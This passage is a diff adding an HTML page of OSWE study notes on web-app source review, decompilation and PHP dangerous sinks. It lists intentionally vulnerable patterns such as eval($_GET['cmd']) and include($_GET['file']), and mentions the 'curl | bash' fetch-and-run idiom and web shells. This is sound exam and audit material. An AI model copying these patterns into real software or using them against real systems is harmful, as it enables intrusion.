@@ -1,0 +1,2853 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Daves Master Notes</title>
+<style>
+  :root { color-scheme: light; font-family: Georgia, "Times New Roman", serif; line-height: 1.55; }
+  body { max-width: 1400px; margin: 0 auto; padding: 2rem 1.25rem; color: #eee; background: #34373a; }
+  nav { margin-bottom: 2rem; padding: 1rem 1.25rem; color: #222; background: #f3e6c8; border: 1px solid #c8b98f; border-radius: 8px; }
+  nav ul { list-style: none; }
+  nav > ul { padding-left: 0; }
+  nav ul ul { padding-left: 1.5rem; }
+  nav li { margin: .25rem 0; }
+  nav a { color: #174a7c; }
+  h1 { border-bottom: 2px solid #222; padding-bottom: .25rem; }
+  h2 { margin-top: 1.75rem; font-size: 1.8em; }
+  details > summary h2 { display: inline; margin: 0; }
+  details { margin-bottom: 2rem; padding: 1rem 1.25rem; color: #222; background: #f3e6c8; border: 1px solid #c8b98f; border-radius: 8px; }
+  h3 { width: 100%; box-sizing: border-box; margin-top: 1.25rem; margin-bottom: 4pt; border-top: 1px solid #d3d3d3; padding-top: .25rem; }
+  header { display: none; }
+  code { font-family: Menlo, Monaco, monospace; font-size: .9em; }
+  pre { overflow-x: auto; padding: 1rem; background: #f3f3f3; border: 1px solid #ddd; }
+  pre code { white-space: pre; }
+  @media print {
+    body { max-width: none; padding: 0; font-size: 50%; color: #222; background: #fff; }
+    header { display: flex; height: 90vh; box-sizing: border-box; flex-direction: column; justify-content: center; align-items: center; text-align: center; page-break-after: always; }
+    .table-of-contents { page-break-before: avoid; }
+    header h1 { border: 0; margin: 0; padding: 0; font-size: 3rem; }
+    header .subtitle { margin: 1rem 0 3rem; font-size: 1.5rem; }
+    header blockquote { max-width: 34rem; margin: 0; font-size: 1.1rem; }
+    header cite { display: block; margin-top: 1rem; font-style: normal; }
+    h2 { font-size: revert; }
+    h3 { page-break-after: avoid; break-after: avoid; }
+    h3 + ul, h3 + p, h3 + pre { page-break-before: avoid; break-before: avoid; }
+    details > section { page-break-inside: avoid; break-inside: avoid; }
+    nav { margin-bottom: 0; padding: 0; color: #222; background: transparent; border: 0; border-radius: 0; page-break-before: avoid; }
+    article { page-break-before: always; break-before: page; }
+    article:first-of-type { page-break-before: auto; break-before: auto; }
+    details[open] { display: block !important; }
+    details > * { display: block !important; }
+    details > summary { display: block !important; }
+    details > summary::-webkit-details-marker { display: none; }
+    details { margin-bottom: 0; padding: 0; color: #222; background: transparent; border: 0; border-radius: 0; page-break-before: always; break-before: page; }
+    article > details:first-of-type { page-break-before: auto; break-before: auto; }
+  }
+</style>
+</head>
+<body>
+<header aria-label="Title page">
+<h1>Daves OSWE Notes</h1>
+<blockquote>
+<p>We live in a world where all wars will begin as cyber wars...<br/> It&#x27;s the combination of hacking and massive, well-coordinated disinformation campaigns.</p>
+<cite>Jared Cohen</cite>
+</blockquote>
+</header>
+<nav aria-label="Table of contents">
+<h1>Contents</h1>
+<ul>
+  <li><a href="#getting-started">Getting Started</a>
+    <ul>
+      <li><a href="#oswe-review-workflow">1. OSWE Review Workflow</a></li>
+      <li><a href="#vs-code-network-debugging-notes">2. VS Code Network Debugging Notes</a></li>
+    </ul>
+  </li>
+  <li><a href="#decompile">Decompile</a>
+    <ul>
+      <li><a href="#java-decompilation-notes">3. Java Decompilation Notes</a></li>
+      <li><a href="#net-decompilation-notes">4. .NET Decompilation Notes</a></li>
+    </ul>
+  </li>
+  <li><a href="#languages">Languages</a>
+    <ul>
+      <li><a href="#php-subtopic-notes">5. PHP Notes</a></li>
+      <li><a href="#java-subtopic-notes">6. Java Notes</a></li>
+      <li><a href="#net-asp-net-core-subtopic-notes">7. .NET / ASP.NET Core Notes</a></li>
+      <li><a href="#node-js-subtopic-notes">8. Node.js Notes</a></li>
+      <li><a href="#python-subtopic-notes">9. Python Notes</a></li>
+    </ul>
+  </li>
+  <li><a href="#vectors">Vectors</a>
+    <ul>
+      <li><a href="#business-logic-idor-notes">10. Business Logic / IDOR Notes</a></li>
+      <li><a href="#information-disclosure">11. Information Disclosure</a></li>
+      <li><a href="#local-file-inclusion-lfi-file-upload-execution">12. Local File Inclusion (LFI) / File Upload + Execution</a></li>
+      <li><a href="#sql-injection-cheat-sheet">13. SQL Injection Cheat Sheet</a></li>
+    </ul>
+  </li>
+</ul>
+</nav>
+<main>
+<article>
+<h1 id="getting-started">Getting Started</h1>
+<details open>
+<summary id="oswe-review-workflow"><h2>1. OSWE Review Workflow</h2></summary>
+<section>
+<h3>Scope</h3>
+<ul>
+<li>quick review methodology for source code auditing</li>
+<li>methodology rather than a vulnerability list: identify the framework, trace input to a real sink, then validate impact</li>
+</ul>
+</section>
+<section>
+<h3>1.1. Start with the framework</h3>
+<ul>
+<li>identify the language and framework first</li>
+<li>ASP.NET Core, Spring Boot, Laravel, Django, Flask, Express, Node, WordPress, raw PHP, Java Servlet, etc.</li>
+<li>each framework has default patterns: routing, sessions, auth, models, templates, config</li>
+<li>if you do not know the stack, you do not know the likely sink</li>
+</ul>
+</section>
+<section>
+<h3>1.2. Identify the route and request flow</h3>
+<ul>
+<li>find the controller / handler / route / page / servlet / view / endpoint</li>
+<li>map: request → input → business logic → sink → response</li>
+<li>look for <code>GET</code>, <code>POST</code>, <code>PUT</code>, <code>DELETE</code>, <code>PATCH</code>, <code>route</code>, <code>@RequestMapping</code>, <code>app.get</code>, <code>router</code>, <code>controller</code>, <code>page model</code></li>
+<li>note which data is attacker-controlled: query, form, cookies, headers, JSON, file upload</li>
+</ul>
+</section>
+<section>
+<h3>1.3. Identify the sink</h3>
+<ul>
+<li>shell / process execution</li>
+<li>SQL execution</li>
+<li>file read / file write / upload</li>
+<li>template render</li>
+<li>object binding / deserialization</li>
+<li>session / auth / JWT / cookies</li>
+<li>SSRF / HTTP client usage</li>
+<li>file include / local include</li>
+<li>custom logic around price, role, privilege, state change</li>
+</ul>
+</section>
+<section>
+<h3>1.4. Trace the input backward</h3>
+<ul>
+<li>start at the sink</li>
+<li>work backward to where the value came from</li>
+<li>ask: is this from query string, POST body, JSON, cookie, file, header, env, config, database?</li>
+<li>if it is attacker-controlled and reaches a sink, test it</li>
+</ul>
+</section>
+<section>
+<h3>1.5. Check the framework defaults</h3>
+<ul>
+<li>auth middleware</li>
+<li>route ordering</li>
+<li>generic vs specific routes</li>
+<li>session setup</li>
+<li>model binding and validation</li>
+<li>file upload handling</li>
+<li>template rendering with raw output</li>
+<li>config and environment handling</li>
+</ul>
+</section>
+<section>
+<h3>1.6. Look for dangerous wrappers</h3>
+<ul>
+<li><code>exec</code>, <code>system</code>, <code>Process.Start</code>, <code>Runtime.exec</code></li>
+<li><code>require</code>, <code>include</code>, <code>readFile</code>, <code>open</code>, <code>File.ReadAllText</code></li>
+<li><code>unserialize</code>, <code>readObject</code>, <code>ObjectInputStream</code>, <code>BinaryFormatter</code></li>
+<li><code>render</code>, <code>@Html.Raw</code>, <code>th:utext</code>, <code>{{ ... }}</code>, <code>${...}</code></li>
+<li><code>raw SQL</code>, <code>query</code>, <code>execute</code>, <code>FromSqlRaw</code>, <code>DbContext</code>, <code>JDBC</code></li>
+<li><code>HttpClient</code>, <code>requests</code>, <code>curl</code>, <code>fetch</code>, <code>WebClient</code></li>
+</ul>
+</section>
+<section>
+<h3>1.7. Check the “safe” code for bypasses</h3>
+<ul>
+<li><code>trim()</code>, <code>replace()</code>, <code>lower()</code>, <code>strip_tags()</code>, regex, normalization</li>
+<li>these are only useful if they gate a real sink</li>
+<li>most of the time they are rabbit holes unless they directly affect raw SQL / shell / file access / template output</li>
+</ul>
+</section>
+<section>
+<h3>1.8. Look for auth and privilege issues</h3>
+<ul>
+<li>missing auth checks</li>
+<li>auth check on only one route or one method</li>
+<li>privilege in request body or object</li>
+<li>secret in config or JS</li>
+<li>IDOR on object IDs, user IDs, roles, file names</li>
+<li>access control in middleware, filters, or custom guards</li>
+</ul>
+</section>
+<section>
+<h3>1.9. Look for object mutation / binding</h3>
+<ul>
+<li><code>req.body</code>, <code>Request.Form</code>, <code>@RequestBody</code>, <code>ModelBinding</code>, <code>BeanUtils.copyProperties</code>, <code>Object.assign</code>, <code>extract</code>, <code>new User(...)</code></li>
+<li>user-controlled keys mutating roles, config, permissions, admin flags, default values</li>
+</ul>
+</section>
+<section>
+<h3>1.10. Look for upload + execution chains</h3>
+<ul>
+<li>upload file to webroot or app dir</li>
+<li>later included, rendered, or executed</li>
+<li>web shell, theme file, plugin file, template file, config file</li>
+<li>check whether file path is user-controlled and later used in a sink</li>
+</ul>
+</section>
+<section>
+<h3>1.11. Look for SSRF / internal service access</h3>
+<ul>
+<li>outbound HTTP from request input</li>
+<li>URL built from user input</li>
+<li>no localhost / internal IP block</li>
+<li>metadata service access or internal admin endpoints reachable</li>
+</ul>
+</section>
+<section>
+<h3>1.12. Check business logic paths</h3>
+<ul>
+<li>price manipulation</li>
+<li>discount logic on backend not frontend</li>
+<li>password reset flow</li>
+<li>token reuse</li>
+<li>multi-step workflows with missing state validation</li>
+<li>role assignment or admin creation flows</li>
+<li>state change abuse: approve / refund / transfer / cancel / redeem</li>
+</ul>
+</section>
+<section>
+<h3>1.13. Check for second-order flows</h3>
+<ul>
+<li>trace input stored in a database, session, cache, file, queue, or log before it reaches a sink</li>
+<li>inspect later requests, background jobs, admin views, exports, and scheduled tasks that consume stored data</li>
+<li>do not require the source and sink to occur in the same request</li>
+</ul>
+</section>
+<section>
+<h3>1.14. Check reachability conditions</h3>
+<ul>
+<li>record the required role, route state, feature flag, tenant, object owner, or prior workflow step</li>
+<li>distinguish a dangerous sink from a sink the attacker can actually reach</li>
+<li>check alternate routes, HTTP methods, error paths, and unauthenticated entry points</li>
+</ul>
+</section>
+<section>
+<h3>1.15. Mark trust-boundary crossings</h3>
+<ul>
+<li>note transitions such as request → database → worker, request → session, or upload → scheduled task</li>
+<li>check whether validation, encoding, or authorization assumptions change at each boundary</li>
+<li>follow data through queues, files, caches, and internal service calls</li>
+</ul>
+</section>
+<section>
+<h3>1.16. Inspect errors and fallback paths</h3>
+<ul>
+<li>review exception handlers, default values, alternate branches, and failed validation behavior</li>
+<li>check whether security checks are skipped when parsing, lookup, or authorization fails</li>
+<li>compare normal and error responses for useful disclosure or changed control flow</li>
+</ul>
+</section>
+<section>
+<h3>1.17. Chain the impact</h3>
+<ul>
+<li>after finding a primitive, ask what it enables next: disclosure, credential recovery, privilege escalation, file write, or code execution</li>
+<li>trace available credentials, internal services, writable paths, and privileged processes</li>
+<li>prefer the shortest demonstrable chain to meaningful impact</li>
+</ul>
+</section>
+<section>
+<h3>1.18. Then use payloads</h3>
+<ul>
+<li>only after sink + input flow are clear</li>
+<li>use payloads to confirm exploitability</li>
+<li>not to begin the review</li>
+</ul>
+</section>
+<section>
+<h3>1.19. Review order</h3>
+<p>1. framework 2. route 3. auth / middleware 4. input source 5. sink 6. input flow 7. payload validation 8. impact assessment</p>
+</section>
+<section>
+<h3>1.20. Final rule</h3>
+<ul>
+<li>if you cannot explain the data flow from input to sink, you do not have a bug yet</li>
+<li>a bug is only real if you can show attacker input reaches a dangerous sink and impacts security</li>
+</ul>
+</section>
+<section>
+<h3>1.21. High-value questions</h3>
+<ul>
+<li>What is the entry point?</li>
+<li>What is the sink?</li>
+<li>What is the user-controlled data?</li>
+<li>Is there a bypass in routing, auth, or validation?</li>
+<li>Is the file/upload/SQL/object/HTTP call raw and attacker-controlled?</li>
+<li>Can the impact be code execution, data exposure, auth bypass, or state change?</li>
+</ul>
+</section>
+</details>
+<details open>
+<summary id="vs-code-network-debugging-notes"><h2>2. VS Code Network Debugging Notes</h2></summary>
+<section>
+<h3>Scope</h3>
+<ul>
+<li>remote file access, debugger attachment, port forwarding, path mapping, troubleshooting, and cleanup for authorized application testing</li>
+</ul>
+</section>
+<section>
+<h3>2.1. Prepare the Remote Host</h3>
+<ul>
+<li>Confirm the application runs remotely: SSH in and run its normal start command, then check its health URL or expected output.</li>
+<li>Confirm the debugger and runtime are installed remotely: run commands such as <code>python --version</code>, <code>java -version</code>, <code>dotnet --info</code>, and the language debugger's version command.</li>
+<li>Record the remote host, SSH port, application port, and debug port.</li>
+<li>Use an authorized host and protect debugger ports with authentication or a firewall.</li>
+</ul>
+</section>
+<section>
+<h3>2.2. Connect VS Code to the Remote Files</h3>
+<ul>
+<li>Install the <strong>Remote - SSH</strong> extension.</li>
+<li>Open the Command Palette and run <code>Remote-SSH: Connect to Host</code>.</li>
+<li>Open the project folder through the remote VS Code window.</li>
+<li>Install language extensions in the remote environment when prompted.</li>
+</ul>
+</section>
+<section>
+<h3>2.3. Configure the Debugger</h3>
+<ul>
+<li>Create or edit <code>.vscode/launch.json</code> on the remote workspace.</li>
+<li>Use <code>request: &quot;launch&quot;</code> to start the program remotely.</li>
+<li>Use <code>request: &quot;attach&quot;</code> when the program is already running.</li>
+<li>Set remote paths, working directory, environment variables, and runtime arguments.</li>
+<li>Add source-file mappings when local and remote paths differ.</li>
+</ul>
+</section>
+<section>
+<h3>2.4. Forward Network Ports</h3>
+<ul>
+<li>Forward the application port so VS Code or a browser can reach the remote service.</li>
+<li>Forward the debugger port when attaching over TCP.</li>
+<li>Prefer SSH port forwarding over exposing debugger ports publicly.</li>
+<li>Confirm the forwarded port works: open the forwarded URL or run <code>curl http://127.0.0.1:&lt;local-port&gt;</code>.</li>
+<li>Check for local port conflicts with <code>lsof -nP -iTCP:&lt;local-port&gt; -sTCP:LISTEN</code>.</li>
+</ul>
+</section>
+<section>
+<h3>2.5. Start or Attach</h3>
+<ul>
+<li>Set breakpoints in the remote workspace.</li>
+<li>Start the debug configuration or attach to the remote process.</li>
+<li>Trigger the remote request or action that reaches the breakpoint.</li>
+<li>Inspect variables, call stacks, threads, and exception details.</li>
+</ul>
+</section>
+<section>
+<h3>2.6. Troubleshoot Connection Problems</h3>
+<ul>
+<li>Check SSH connectivity and the remote VS Code server status.</li>
+<li>Confirm the process is listening: run <code>ss -ltnp | grep &lt;port&gt;</code> on Linux or <code>lsof -nP -iTCP:&lt;port&gt; -sTCP:LISTEN</code> on macOS.</li>
+<li>Check remote firewall rules and SSH forwarding settings.</li>
+<li>Verify interpreter, SDK, dependencies, permissions, and environment variables are remote.</li>
+<li>Recheck path mappings when breakpoints show as unverified.</li>
+</ul>
+</section>
+<section>
+<h3>2.7. Clean Up</h3>
+<ul>
+<li>Stop the debug session and terminate temporary processes.</li>
+<li>Remove temporary port forwards and debug listeners.</li>
+<li>Do not commit secrets, private keys, or environment files to the workspace.</li>
+</ul>
+ </details>
+</section>
+</article>
+<article>
+<h1 id="decompile">Decompile</h1>
+<details open>
+<summary id="java-decompilation-notes"><h2>3. Java Decompilation Notes</h2></summary>
+<section>
+<h3>3.1. Identify the Artifact</h3>
+<ul>
+<li>Find <code>.jar</code>, <code>.war</code>, <code>.ear</code>, <code>.class</code>, or Android <code>.apk</code> files.</li>
+<li>Record the Java version and application framework if visible.</li>
+<li>Preserve the original file and work on a copy.</li>
+</ul>
+</section>
+<section>
+<h3>3.2. Extract the Archive</h3>
+<ul>
+<li><code>.jar</code> / <code>.war</code> / <code>.ear</code>: unzip into a separate directory.</li>
+<li>Inspect <code>WEB-INF/classes</code>, <code>WEB-INF/lib</code>, and <code>META-INF</code>.</li>
+<li>List embedded libraries and configuration files.</li>
+</ul>
+</section>
+<section>
+<h3>3.3. Decompile the Classes</h3>
+<ul>
+<li>Use a Java decompiler such as CFR, FernFlower, or JADX.</li>
+<li>Example: <code>java -jar cfr.jar app.jar --outputdir decompiled</code></li>
+<li>Decompile individual <code>.class</code> files when the full archive is noisy.</li>
+<li>Expect approximate source, not the original source code.</li>
+</ul>
+</section>
+<section>
+<h3>3.4. Search the Output</h3>
+<ul>
+<li>Search routes, controllers, filters, servlets, and security configuration.</li>
+<li>Search sensitive sinks: <code>Runtime.exec</code>, <code>ProcessBuilder</code>, JDBC queries, file APIs, deserialization, reflection, and template rendering.</li>
+<li>Trace request parameters, headers, cookies, and uploaded files to those sinks.</li>
+<li>Check configuration for secrets, debug mode, internal URLs, and dangerous options.</li>
+</ul>
+</section>
+<section>
+<h3>3.5. Confirm Behavior</h3>
+<ul>
+<li>Compare decompiled logic with bytecode tools such as <code>javap -c -p</code>.</li>
+<li>Verify important findings by reproducing the request in a local or authorized lab.</li>
+<li>Check library versions and compare them with known vulnerabilities.</li>
+</ul>
+</section>
+<section>
+<h3>3.6. Common Limitations</h3>
+<ul>
+<li>Variable names, comments, formatting, and some generic types may be lost.</li>
+<li>Obfuscation can hide class and method meanings.</li>
+<li>Decompiled control flow may be inaccurate around synthetic or optimized bytecode.</li>
+<li>Treat decompiled code as a guide and validate high-impact conclusions against bytecode or runtime behavior.</li>
+</ul>
+</section>
+</details>
+<details open>
+<summary id="net-decompilation-notes"><h2>4. .NET Decompilation Notes</h2></summary>
+<section>
+<h3>4.1. Identify the Artifact</h3>
+<ul>
+<li>Find <code>.dll</code>, <code>.exe</code>, <code>.deps.json</code>, <code>.runtimeconfig.json</code>, <code>.cshtml</code>, or published application files.</li>
+<li>Identify the target runtime: .NET Framework, .NET Core, or modern .NET.</li>
+<li>Preserve the original files and work on a copy.</li>
+</ul>
+</section>
+<section>
+<h3>4.2. Inspect the Application</h3>
+<ul>
+<li>Check <code>web.config</code>, <code>appsettings.json</code>, environment files, and launch settings.</li>
+<li>Inspect <code>bin</code>, <code>publish</code>, <code>wwwroot</code>, and referenced assemblies.</li>
+<li>Record framework and package versions from <code>.deps.json</code> or project metadata.</li>
+</ul>
+</section>
+<section>
+<h3>4.3. Decompile the Assemblies</h3>
+<ul>
+<li>Use ILSpy, <code>ilspycmd</code>, dnSpyEx, or dotPeek.</li>
+<li>Example: <code>ilspycmd -p -o decompiled app.dll</code></li>
+<li>Open referenced DLLs when important logic is outside the main assembly.</li>
+<li>Expect reconstructed C# rather than the original source code.</li>
+</ul>
+</section>
+<section>
+<h3>4.4. Common Decompiler Tools</h3>
+<ul>
+<li>ILSpy: green insect / bug icon; open-source .NET assembly browser.</li>
+<li><code>ilspycmd</code>: terminal icon; command-line ILSpy for scripted exports.</li>
+<li>dnSpyEx: purple debugger-style icon; inspect, edit, and debug assemblies.</li>
+<li>dotPeek: purple JetBrains logo; decompile and browse .NET assemblies.</li>
+<li><code>ildasm</code>: terminal or command-prompt icon; Microsoft IL disassembler.</li>
+</ul>
+</section>
+<section>
+<h3>4.5. Search the Output</h3>
+<ul>
+<li>Search controllers, Razor Pages, middleware, filters, minimal API routes, and authorization checks.</li>
+<li>Search sensitive sinks: <code>Process.Start</code>, <code>ProcessStartInfo</code>, <code>Assembly.Load</code>, reflection, file APIs, SQL APIs, deserialization, and template rendering.</li>
+<li>Trace query, form, JSON, header, cookie, and uploaded-file input to those sinks.</li>
+<li>Check configuration for secrets, connection strings, debug settings, internal URLs, and unsafe options.</li>
+</ul>
+</section>
+<section>
+<h3>4.6. Confirm Behavior</h3>
+<ul>
+<li>Inspect IL with ILSpy or <code>ildasm</code> when reconstructed C# is unclear.</li>
+<li>Compare method signatures and control flow across referenced assemblies.</li>
+<li>Reproduce important findings only in an authorized local or lab environment.</li>
+<li>Check package versions against known vulnerabilities.</li>
+</ul>
+</section>
+<section>
+<h3>4.7. Common Limitations</h3>
+<ul>
+<li>Comments, formatting, local names, and some source structure may be lost.</li>
+<li>Obfuscation can hide types, methods, and control flow.</li>
+<li>Compiler-generated async, iterator, and state-machine code can look unfamiliar.</li>
+<li>Treat decompiled C# as a guide and validate high-impact conclusions against IL or runtime behavior.</li>
+</ul>
+ </details>
+</section>
+</article>
+<article>
+<h1 id="languages">Languages</h1>
+<details open>
+<summary id="php-subtopic-notes"><h2>5. PHP Notes</h2></summary>
+<section>
+<h3>Scope</h3>
+<ul>
+<li>PHP web-app review across raw PHP, Laravel, Symfony, WordPress, and CodeIgniter, with emphasis on framework behavior and dangerous sinks</li>
+</ul>
+</section>
+<section>
+<h3>5.0. Identify the Stack</h3>
+<ul>
+<li>Plain PHP: <code>$_GET</code>, <code>$_POST</code>, <code>$_REQUEST</code>, <code>$_COOKIE</code>, <code>$_SERVER</code>, <code>$_FILES</code>, <code>header()</code>, <code>echo</code>, <code>print</code>, <code>include</code>, <code>require</code></li>
+<li>Laravel: <code>Route::get</code>, <code>Route::post</code>, <code>Request</code>, <code>Input::get</code>, <code>request()</code>, <code>Response</code>, <code>View::make</code>, <code>Blade</code></li>
+<li>Symfony: <code>Controller</code>, <code>Request</code>, <code>ParameterBag</code>, <code>Response</code>, <code>Twig</code>, <code>render()</code></li>
+<li>WordPress: <code>add_action</code>, <code>add_filter</code>, <code>wp_remote_get</code>, <code>get_option</code>, <code>wpdb-&gt;get_results</code>, <code>query_posts</code>, <code>do_shortcode</code></li>
+<li>CodeIgniter: <code>-&gt;get</code>, <code>-&gt;post</code>, <code>input-&gt;get</code>, <code>view</code>, <code>model</code></li>
+<li>Raw PHP file execution: <code>include</code>, <code>require</code>, <code>include_once</code>, <code>require_once</code>, <code>eval</code>, <code>assert</code>, <code>preg_replace(&#x27;/.../e&#x27;)</code></li>
+</ul>
+</section>
+<section>
+<h3>5.1. Identify the Template Engine</h3>
+<ul>
+<li>Twig: <code>{{ ... }}</code>, <code>{% ... %}</code></li>
+<li>Blade: <code>{{ ... }}</code>, <code>@php</code>, <code>@include</code>, <code>@foreach</code>, <code>@if</code></li>
+<li>Smarty: <code>{...}</code></li>
+<li>native PHP templates: <code>&lt;?= $var ?&gt;</code>, <code>&lt;?php echo $var ?&gt;</code></li>
+<li>custom template loaders: <code>render</code>, <code>template</code>, <code>view</code>, <code>mustache</code>, <code>handlebars</code></li>
+<li>route → controller → template → user input</li>
+</ul>
+</section>
+<section>
+<h3>5.2. The 10 Patterns to Check First</h3>
+<ul>
+<li>User input and route confusion:  <code>$_GET</code>, <code>$_POST</code>, <code>$_REQUEST</code>, <code>$_COOKIE</code>, <code>$_SERVER</code>, <code>$_FILES</code>, route files, router configs</li>
+<li>Code execution:  <code>eval</code>, <code>assert</code>, <code>preg_replace(... /e )</code>, <code>create_function</code>, <code>call_user_func</code>, <code>call_user_func_array</code>, <code>array_map</code> with string callable</li>
+<li>Command injection:  <code>exec</code>, <code>shell_exec</code>, <code>system</code>, <code>passthru</code>, <code>popen</code>, <code>proc_open</code>, <code>pcntl_exec</code>, <code>curl | bash</code></li>
+<li>Insecure deserialization / XXE:  <code>unserialize</code>, <code>serialize</code>, <code>yaml_parse</code>, <code>xml_parse</code>, <code>simplexml_load_string</code>, <code>DOMDocument::loadXML</code></li>
+<li>SSTI / template injection:  <code>{{ ... }}</code>, <code>{% ... %}</code>, <code>&lt;?= $var ?&gt;</code>, <code>Blade</code>, <code>Twig</code>, <code>Smarty</code>, <code>render</code></li>
+<li>XSS:  <code>echo</code>, <code>print</code>, <code>header</code>, <code>print_r</code>, raw HTML output</li>
+<li>File upload / write abuse:  <code>move_uploaded_file</code>, <code>file_put_contents</code>, <code>fopen</code>, <code>fwrite</code>, <code>rename</code>, <code>tmp_name</code>, <code>$_FILES</code></li>
+<li>SQLi:  <code>mysqli_query</code>, <code>PDO::query</code>, <code>SELECT</code>, <code>ORDER BY</code>, <code>UNION</code>, <code>LIMIT</code></li>
+<li>Traversal / file read abuse:  <code>file_get_contents</code>, <code>fopen</code>, <code>readfile</code>, <code>include</code>, <code>require</code>, <code>glob</code>, <code>opendir</code>, <code>file_exists</code>, <code>unlink</code></li>
+<li>Mass assignment / object mutation:  <code>extract</code>, <code>parse_str</code>, <code>foreach ($_GET as ...)</code>, <code>$_REQUEST</code>, <code>array_merge</code>, <code>array_walk</code>, <code>-&gt;set</code>, <Code>Session</code> / config arrays</li>
+</ul>
+</section>
+<section>
+<h3>5.3. Routing</h3>
+<ul>
+<li>Plain PHP: <code>index.php</code>, <code>mod_rewrite</code>, <code>.htaccess</code>, custom routing, <code>$_SERVER[&#x27;REQUEST_URI&#x27;]</code>, <code>parse_url</code>, <code>router</code></li>
+<li>Laravel: <code>Route::get</code>, <code>Route::post</code>, <code>Route::any</code>, <code>Route::resource</code>, <code>-&gt;where</code>, <code>-&gt;middleware</code></li>
+<li>Symfony: <code>@Route</code>, <code>@Method</code>, <code>router</code> config, <code>Request</code> matching</li>
+<li>WordPress: <code>add_action(&#x27;wp_ajax_...&#x27;)</code>, <code>add_rewrite_rule</code>, <code>template_redirect</code>, <code>admin_post</code></li>
+<li>Safe rule: specific before generic; generic before specific = danger</li>
+<li>Search for: <code>Route::</code>, <code>$_SERVER[&#x27;REQUEST_URI&#x27;]</code>, <code>router</code>, <code>rewrite</code>, <code>template_redirect</code>, <code>index.php?</code></li>
+</ul>
+</section>
+<section>
+<h3>5.4. Code Execution</h3>
+<ul>
+<li><code>eval($x)</code>, <code>assert($x)</code>, <code>preg_replace(&#x27;/.*/e&#x27;, ...)</code>, <code>create_function(...)</code>, <code>call_user_func($fn, ...)</code></li>
+<li><code>shell_exec</code>, <code>exec</code>, <code>system</code>, <code>passthru</code>, <code>proc_open</code>, <code>popen</code></li>
+<li><code>include $tainted</code>, <code>require $tainted</code>, <code>include_once</code>, <code>require_once</code></li>
+<li>dynamic class loading: <code>new $class()</code>, <code>call_user_func([$obj, $method])</code>, <code>ReflectionClass</code>, <code>unserialize()</code></li>
+<li>template engines used with untrusted input and rendering context</li>
+<li>search for: <code>eval</code>, <code>assert</code>, <code>exec</code>, <code>system</code>, <code>include</code>, <code>require</code>, <code>preg_replace</code>, <code>call_user_func</code>, <code>new $</code></li>
+</ul>
+<h4>4.1. PHP RCE patterns</h4>
+<ul>
+<li><code>eval($_GET[&#x27;cmd&#x27;])</code></li>
+<li><code>assert($_POST[&#x27;x&#x27;])</code></li>
+<li><code>preg_replace(&#x27;/.*/e&#x27;, $_GET[&#x27;p&#x27;], &#x27;text&#x27;)</code></li>
+<li><code>include($_GET[&#x27;file&#x27;])</code></li>
+<li><code>require($userInput . &#x27;/config.php&#x27;)</code></li>
+<li><code>call_user_func($_GET[&#x27;func&#x27;], $_GET[&#x27;arg&#x27;])</code></li>
+<li><code>new $className()</code> where <code>$className</code> is user-controlled</li>
+</ul>
+<h4>4.2. High-value sinks / file names</h4>
+<ul>
+<li><code>exec.php</code>, <code>shell.php</code>, <code>commands.php</code>, <code>utils.php</code>, <code>loader.php</code>, <code>render.php</code>, <code>template.php</code>, <code>config.php</code></li>
+<li><code>cmd</code>, <code>command</code>, <code>exec</code>, <code>shell</code>, <code>script</code>, <code>path</code>, <code>file</code>, <code>include</code>, <code>require</code>, <code>template</code>, <code>eval</code>, <code>func</code>, <code>class</code></li>
+<li><code>system</code>, <code>exec</code>, <code>popen</code>, <code>proc_open</code>, <code>preg_replace</code>, <code>call_user_func</code>, <code>assert</code>, <code>include</code></li>
+</ul>
+<h4>4.3. What to do when you find it</h4>
+<ul>
+<li>Confirm user input reaches the sink</li>
+<li>Check whether the sink is direct code execution or a wrapper around a shell</li>
+<li>Check whether input is concatenated into a command or loaded path</li>
+<li>Determine privileges and impact: file read, RCE, persistence, pivoting</li>
+</ul>
+</section>
+<section>
+<h3>5.5. Command Injection</h3>
+<ul>
+<li><code>system($cmd)</code>, <code>exec($cmd)</code>, <code>shell_exec($cmd)</code>, <code>passthru($cmd)</code>, <code>proc_open($cmd)</code>, <code>popen($cmd)</code></li>
+<li><code>bash -c</code>, <code>sh -c</code>, <code>powershell -Command</code>, <code>cmd /c</code></li>
+<li>user input into <code>cmd</code>, <code>command</code>, <code>exec</code>, <code>script</code>, <code>path</code>, <code>filename</code>, <code>url</code>, <code>args</code></li>
+<li>search for: <code>exec(</code>, <code>shell_exec</code>, <code>system(</code>, <code>passthru(</code>, <code>popen(</code>, <code>proc_open(</code>, <code>bash -c</code>, <code>cmd /c</code></li>
+</ul>
+</section>
+<section>
+<h3>5.6. Insecure Deserialization</h3>
+<ul>
+<li><code>unserialize($data)</code>, <code>serialize($obj)</code>, <code>yaml_parse</code>, <code>simplexml_load_string</code>, <code>DOMDocument::loadXML</code></li>
+<li>object injection via <code>__wakeup</code>, <code>__destruct</code>, <code>__toString</code>, <code>__call</code>, gadget chains</li>
+<li>PHP object injection often relies on magic methods and unsafe <code>unserialize</code> of request data</li>
+<li>search for: <code>unserialize</code>, <code>yaml_parse</code>, <code>simplexml_load_string</code>, <code>DOMDocument</code>, <code>serialize</code>, <code>$_POST</code>, <code>$_GET</code></li>
+</ul>
+</section>
+<section>
+<h3>5.7. Templates / SSTI</h3>
+<ul>
+<li>Twig: <code>{{ ... }}</code></li>
+<li>Blade: <code>{{ ... }}</code></li>
+<li>Smarty: <code>{...}</code></li>
+<li>native PHP template output: <code>&lt;?= $var ?&gt;</code>, <code>&lt;?php echo $var ?&gt;</code></li>
+<li>route → controller → template → user input</li>
+<li>payloads usually hit <code>{{</code>, <code>{%</code>, <code>&lt;?=</code>, <code>${</code>, <code>${{</code> depending on the engine</li>
+</ul>
+</section>
+<section>
+<h3>5.8. XSS</h3>
+<ul>
+<li><code>echo</code>, <code>print</code>, <code>print_r</code>, raw HTML responses, template output without encoding</li>
+<li><code>$_GET</code>, <code>$_POST</code>, <code>$_COOKIE</code>, <code>$_SERVER</code>, route params, headers, JSON</li>
+<li><code>htmlspecialchars</code>, <code>strip_tags</code> are helpful only if used correctly; raw output is a warning sign</li>
+<li>search for: <code>echo</code>, <code>print</code>, <code>HTML</code>, <code>template</code>, <code>render</code>, <code>Response</code>, <code>raw</code>, <code>Blade</code>, <code>Twig</code>, <code>&lt;?=</code></li>
+</ul>
+</section>
+<section>
+<h3>5.9. File Upload</h3>
+<ul>
